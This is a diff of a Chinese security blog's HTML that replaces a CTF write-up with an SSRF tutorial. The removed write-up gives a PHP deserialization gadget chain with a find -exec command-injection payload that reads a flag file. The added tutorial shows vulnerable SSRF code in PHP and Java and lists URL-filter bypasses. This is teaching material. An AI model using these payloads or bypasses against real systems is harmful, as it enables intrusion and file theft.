@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
-<title>记一道反序列化&amp;find命令执行题目 | outlaws&#39; blog</title>
+<title>ssrf详解 | outlaws&#39; blog</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1616556362354">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -52,8 +52,8 @@
 
 
 
-  <meta name="description" content="记一道反序列化&find命令执行题目" />
-  <meta name="keywords" content="web,getshell,php,反序列化" />
+  <meta name="description" content="ssrf详解" />
+  <meta name="keywords" content="ssrf,knowledge-web" />
 </head>
 
 <body>
@@ -268,9 +268,32 @@
   <div class="toc-wrapper auto-number auto"
     id="toc_wrapper">
     <ul class="markdownIt-TOC">
-<li><a href="#part1-md5%E7%BB%95%E8%BF%87">part1 md5绕过</a></li>
-<li><a href="#part2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">part2 反序列化</a></li>
-<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">漏洞挖掘</a>
+<ul>
+<li><a href="#%E4%BB%8Eweb%E5%8A%9F%E8%83%BD%E4%B8%8A%E5%AF%BB%E6%89%BE">从web功能上寻找</a></li>
+<li><a href="#%E4%BB%8Eurl%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%AD%E5%AF%BB%E6%89%BE">从URL关键字中寻找</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BA%90%E4%BB%A3%E7%A0%81">源代码</a>
+<ul>
+<li><a href="#php">php</a></li>
+<li><a href="#java">JAVA</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">绕过技巧</a>
+<ul>
+<li><a href="#%E7%AC%A6%E5%8F%B7">@符号</a></li>
+<li><a href="#%E6%B7%BB%E5%8A%A0%E7%AB%AF%E5%8F%A3">添加端口</a></li>
+<li><a href="#">[::]</a></li>
+<li><a href="#%E7%9F%AD%E5%9C%B0%E5%9D%80">短地址</a></li>
+<li><a href="#xipio">xip.io</a></li>
+<li><a href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2">进制转换</a></li>
+<li><a href="#dns-rebinding%E9%87%8D%E7%BB%91%E5%AE%9A">DNS rebinding(重绑定)</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE">可以使用的协议</a></li>
 </ul>
 
   </div>
@@ -536,8 +559,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://outlaws-bai.github.io/post/fanxuliehua&amp;find/">
-      记一道反序列化&amp;find命令执行题目
+    <a class="post-title-link" href="https://outlaws-bai.github.io/post/ssrf/">
+      ssrf详解
     </a>
   </h1>
   <div class="post-meta">
@@ -545,7 +568,7 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-03-23 11:30:53">2021-03-23</span>
+      <span class="publish-time" data-t="2021-03-24 11:25:05">2021-03-24</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
@@ -554,26 +577,14 @@
       <span class="pc-show language" data-lan="category-in">分类于</span>
       
       
-      <a href="https://outlaws-bai.github.io/tag/UH3enqSU7/">
-        <span>web</span>
+      <a href="https://outlaws-bai.github.io/tag/ethyXkjUc/">
+        <span>ssrf</span>
       </a>、
       
       
       
-      <a href="https://outlaws-bai.github.io/tag/SxZ_xt-qo/">
-        <span>getshell</span>
-      </a>、
-      
-      
-      
-      <a href="https://outlaws-bai.github.io/tag/mGihl_9un/">
-        <span>php</span>
-      </a>、
-      
-      
-      
-      <a href="https://outlaws-bai.github.io/tag/Fz3gUNBGL/">
-        <span>反序列化</span>
+      <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/">
+        <span>knowledge-web</span>
       </a>
       
       
@@ -587,122 +598,272 @@
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>811<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>753<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <p>打开题目</p>
-<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616470323708.png" alt="" loading="lazy"></figure>
-<h1 id="part1-md5绕过">part1 md5绕过</h1>
-<p>右键查看源码提示有index.php.bak，下载后打开</p>
-<pre><code class="language-php">&lt;?php
-    error_reporting(0);
-    $rand_str = '********';
-    $cookie_data = json_decode($_COOKIE['data'], true);
-    if ($cookie_data['data'] == strtolower(md5($rand_str))) {
-        $a = $_POST['a'];
-        $b = $_POST['b'];
-        if ($a != $b &amp;&amp; sha1($a) === sha1($b)) {
-            include('******.php');
-        }else{
-            '!!';
-        }
-    }else{
-        echo '!';
-    } 
+              <h1 id="漏洞简介">漏洞简介</h1>
+<p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制。</p>
+<p>网站中对外发起网络请求的地方都可能存在ssrf漏洞。</p>
+<h1 id="漏洞危害">漏洞危害</h1>
+<ul>
+<li>1、被当做跳板对外网服务DDOS</li>
+<li>2、对服务器所在内网存活主机扫描、以及对这些主机的端口指纹进行识别(dict协议)</li>
+<li>3、攻击运行在内网或本地的脆弱组件或应用程序（比如redis、mysql等）</li>
+<li>4、对内网Web应用进行指纹识别，通过访问默认文件实现</li>
+<li>5、读本地文件(file协议)</li>
+</ul>
+<h1 id="漏洞挖掘">漏洞挖掘</h1>
+<h2 id="从web功能上寻找">从web功能上寻找</h2>
+<ul>
+<li>1、分享功能：通过URL地址分享网页内容</li>
+<li>2、转码服务：通过URL地址把原地址的网页内容调优为适合手机屏幕游览</li>
+<li>3、在线翻译：通过URL翻译对应文本的内容</li>
+<li>4、图片加载与下载：通过URL地址加载或下载图片</li>
+<li>5、图片和文章的收藏功能</li>
+<li>6、未公开的api实现以及其他调用URL的功能</li>
+</ul>
+<h2 id="从url关键字中寻找">从URL关键字中寻找</h2>
+<p>share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p>
+<h1 id="源代码">源代码</h1>
+<h2 id="php">php</h2>
+<p>下面是一段通过URL地址加载图片的php代码实现</p>
+<pre><code>&lt;?php
+    if(isset($_GET['url'])){
+        $content=file_get_contents($_GET['url']);
+        $filename=''.rand().'img.png';
+        $fopen = fopen($filename,'wb');
+        file_put_contents($filename, $content);
+        $img=&quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;
+        echo $img;
+    }
 ?&gt;
+
+#http://127.0.0.1/ssrf.php?url=http://127.0.0.1/1.png
+#此时就可以利用http://127.0.0.1/ssrf.php?url=http://127.0.0.1/index.php读取index.php的内容
+#php中可能触发ssrf的函数有：file_put_contents,fsockopen,curl_exec
 </code></pre>
-<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))</p>
-<p>设置Cookie:data={&quot;data&quot;:1}，爆破1-1000得到data为25时，可使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))【为true也可以】</p>
-<p>$a != <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;&amp;&#039; at position 3: b &amp;̲&amp; sha1('>b &amp;&amp; sha1(</span>a) === sha1($b)</p>
-<p>a[]=1&amp;b[]=2绕过即可</p>
-<h1 id="part2-反序列化">part2 反序列化</h1>
-<pre><code class="language-php">&lt;?php   
-class getresult{
-    public $obj;
-    public $file;
+<h2 id="java">JAVA</h2>
+<p>下面是一段通过URL连接加载内容并输出的java代码实现</p>
+<pre><code>//HttpURLConnection ssrf vul
+String url = request.getParameter(&quot;url&quot;);
+URL u = new URL(url);
+URLConnection urlConnection = u.openConnection();  
+HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   
+BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //发起请求,触发漏洞String inputLine;
+StringBuffer html = new StringBuffer(); 
+while ((inputLine = in.readLine()) != null) {
+	html.append(inputLine);
+	}        
+System.out.println(&quot;html:&quot; + html.toString());
+in.close();
 
-    function __destruct()
-    {
-        if ($this-&gt;file != '')
-        {
-            $this-&gt;obj-&gt;execute();
-        }
-        else
-        {
-            die('fail to getshell!!!');
-        }
-    }
-
-    function __wakeup()
-    {
-        foreach(get_object_vars($this) as $key =&gt; $value)
-        {
-            $this-&gt;$key = null;
-        }
-        echo &quot;wakeup&quot;;
-    }
-}
-
-class find{
-    private $file;
-    function execute(){
-        system(&quot;find /tmp -iname &quot;.escapeshellcmd($this-&gt;file)); 
-        die('Success!!!');
-    }
-}
-if(isset($_GET['pop'])){
-    $pop = $_GET['pop'];
-    preg_match('/[oc]:\d+:/i', $pop, $result);
-    if(count($result)){
-        die('no!');
-    }
-    unserialize($pop);
-}
-
-show_source(__FILE__); 
+#java可触发的有:HttpURLConnection,urlConnection,ImageIO,Request,openStream,OkHttpClinet,HttpClinets
 </code></pre>
-<p>1.绕过preg_match('/[oc]:\d+:/i', $pop, $result);处正则，只需使得O:+9即可，但要注意+需使用url编码后的%2B，否则会被解析为空格</p>
-<p>2.绕过__wakeup()  O:9:&quot;getresult&quot;:2:{   将2改为3</p>
-<p>3.escapeshellcmd()</p>
-<p>escapeshellcmd()函数对字符串中可能会欺骗shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()或 system() 函数，或者执行操作符之前进行转义。<br>
-反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$,\x0A 和 \xFF。 ' 和 &quot; 仅在不配对儿的时候被转义。 在 Windows平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。<br>
-而find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。<br>
-所以可以构造后payload为：find /tmp -iname sth -or -exec ls ;<br>
-在构造pop时不添加\是因为escapeshellcmd()函数会为;自动添加，命令执行成功后即可读取flag文件，获取flag。</p>
-<p>构造pop：</p>
-<pre><code class="language-php">&lt;?php   
-class getresult{
-    public $obj;
-    public $file;
-    function __construct() {
-        $this-&gt;obj = new find();
-        $this-&gt;file = 'sth -or -exec cat /f111ag ;';
-    }
-}
-
-class find{
-    private $file='sth -or -exec cat /f111ag ;';
-}
-
-// $f=new find();
-// echo serialize($f)
-$g=new getresult();
-echo urlencode(serialize($g));
-echo serialize($g);
-
-#O%3A%2B9%3A%22getresult%22%3A3%3A%7Bs%3A3%3A%22obj%22%3BO%3A%2B4%3A%22find%22%3A1%3A%7Bs%3A10%3A%22%00find%00file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7Ds%3A4%3A%22file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7D
-
-?&gt;
+<h1 id="绕过技巧">绕过技巧</h1>
+<p>主要取决于代码对url的检测</p>
+<h2 id="符号">@符号</h2>
+<p>url格式为</p>
+<p><code>http://username:password@ip:port/path</code></p>
+<p>可以利用@绕过，如</p>
+<p><code>http://example.com@127.0.0.1</code></p>
+<h2 id="添加端口">添加端口</h2>
+<pre><code>http://127.0.0.1:80
+http://localhost:22
 </code></pre>
-<p>即可getflag</p>
-<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616470360978.png" alt="" loading="lazy"></figure>
-<h1 id="小结">小结</h1>
-<p>find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。<br>
-所以可以构造payload为：find /tmp -iname sth -or -exec ls ;<br>
-在构造pop时不添加\是因为escapeshellcmd()函数会为;自动添加，命令执行成功后即可读取flag文件，获取flag。</p>
+<h2 id="">[::]</h2>
+<pre><code>利用[::]绕过localhost
+http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1
+</code></pre>
+<h2 id="短地址">短地址</h2>
+<p>302跳转</p>
+<pre><code>http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1
+</code></pre>
+<h2 id="xipio">xip.io</h2>
+<pre><code>http://127.0.0.1.xip.io/   &gt;&gt;&gt;  http://127.0.0.1
+</code></pre>
+<h2 id="进制转换">进制转换</h2>
+<ul>
+<li>十进制</li>
+<li>八进制</li>
+<li>十六进制</li>
+<li>不同进制组合转换</li>
+</ul>
+<pre><code>http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/
+</code></pre>
+<h2 id="dns-rebinding重绑定">DNS rebinding(重绑定)</h2>
+<p>后边专题讲吧</p>
+<h1 id="可以使用的协议">可以使用的协议</h1>
+<p>常见的协议有file://，http://，ftp://，gopher://，php://</p>
+<p>根据不同语言分类如下(空处主要取决于版本或是否开启设置)</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>php</th>
+<th>java</th>
+<th>curl</th>
+<th>perl</th>
+<th>asp.net</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>http</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>https</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>gopher</td>
+<td></td>
+<td></td>
+<td></td>
+<td>√</td>
+<td></td>
+</tr>
+<tr>
+<td>tftp</td>
+<td></td>
+<td>×</td>
+<td></td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>dict</td>
+<td></td>
+<td>×</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>file</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>imap</td>
+<td></td>
+<td>×</td>
+<td>√</td>
+<td>√</td>
+<td>×</td>
+</tr>
+<tr>
+<td>pop3</td>
+<td></td>
+<td>×</td>
+<td>√</td>
+<td>√</td>
+<td>×</td>
+</tr>
+<tr>
+<td>rtsp</td>
+<td></td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>smb</td>
+<td></td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>smtp</td>
+<td></td>
+<td>×</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>telnet</td>
+<td></td>
+<td>×</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>ssh2</td>
+<td></td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>ogg</td>
+<td></td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>expect</td>
+<td></td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>idap</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>√</td>
+<td>×</td>
+</tr>
+<tr>
+<td>php</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr>
+<td>zlib/bzip2/zip</td>
+<td></td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+</tbody>
+</table>
 
             </div>
             
@@ -715,7 +876,7 @@ echo serialize($g);
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://outlaws-bai.github.io/post/fanxuliehua&amp;find/" title="记一道反序列化&amp;find命令执行题目">https://outlaws-bai.github.io/post/fanxuliehua&amp;find/</a>
+      <a href="https://outlaws-bai.github.io/post/ssrf/" title="ssrf详解">https://outlaws-bai.github.io/post/ssrf/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -724,27 +885,19 @@ echo serialize($g);
   </ul>
   <div class="tags">
     
-      <a href="https://outlaws-bai.github.io/tag/UH3enqSU7/"># web</a>
+      <a href="https://outlaws-bai.github.io/tag/ethyXkjUc/"># ssrf</a>
     
-      <a href="https://outlaws-bai.github.io/tag/SxZ_xt-qo/"># getshell</a>
-    
-      <a href="https://outlaws-bai.github.io/tag/mGihl_9un/"># php</a>
-    
-      <a href="https://outlaws-bai.github.io/tag/Fz3gUNBGL/"># 反序列化</a>
+      <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/"># knowledge-web</a>
     
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="ssrf详解" href="https://outlaws-bai.github.io/post/ssrf/">ssrf详解</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="ssrf详解" href="https://outlaws-bai.github.io/post/ssrf/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">记一道session文件包含题目</a>
-        <a class="nav-mobile-next" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">下一篇</a>
+        <a class="nav-pc-next" title="记一道反序列化&amp;find命令执行题目" href="https://outlaws-bai.github.io/post/fanxuliehua&amp;find/">记一道反序列化&amp;find命令执行题目</a>
+        <a class="nav-mobile-next" title="记一道反序列化&amp;find命令执行题目" href="https://outlaws-bai.github.io/post/fanxuliehua&amp;find/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
